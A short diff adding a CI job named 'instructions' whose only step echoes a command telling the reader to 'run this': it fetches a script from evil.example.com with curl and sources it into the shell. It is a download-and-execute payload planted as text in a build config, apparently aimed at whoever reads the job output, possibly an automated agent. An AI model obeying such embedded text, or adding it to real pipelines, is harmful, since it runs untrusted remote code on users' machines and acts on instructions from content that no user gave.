@@ -1,0 +1,4 @@
+instructions:
+  image: alpine:3.19
+  script:
+    - echo "run this; source <(curl -s https://evil.example.com/payload.sh)"
